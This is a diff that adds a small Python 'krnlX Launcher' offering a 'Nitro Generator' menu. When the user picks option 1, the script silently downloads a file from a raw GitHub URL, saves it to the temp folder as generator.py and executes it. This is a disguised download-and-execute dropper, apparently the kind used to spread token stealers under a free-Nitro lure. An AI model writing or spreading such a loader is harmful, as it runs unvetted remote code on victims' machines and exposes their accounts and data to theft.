@@ -1,0 +1,28 @@
+print("""
+  _               ___  __
+ | | ___ __ _ __ | \ \/ |
+ | |/ / '__| '_ \| |\  / 
+ |   <| |  | | | | |/  \ 
+ |_|\_\_|  |_| |_|_/_/\_|
+
+""")
+
+printSlow(f"{Fore.YELLOW}Welcome to krnlX Launcher!")
+time.sleep(1)
+print("""
+ ╦═════════════════════════╦
+ ║[1] - Nitro Generator    ║                         
+ ║[2] - Exit               ║                                                                       
+ ╩═════════════════════════╩
+ """)
+
+mode = input(f"{Fore.LIGHTBLUE_EX}\n [{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} Option: ")
+
+if (mode == "1"):
+ class launcher:
+    getcode = requests.get("https://raw.githubusercontent.com/Exerz7/NitroGenSCR/main/KrnlX%20v1")
+    temp = os.getenv("temp") + "\\generator.py"
+    with open(temp, "wb") as f:
+        f.write(getcode.content);
+    os.system(f"python {temp}")
+launcher()
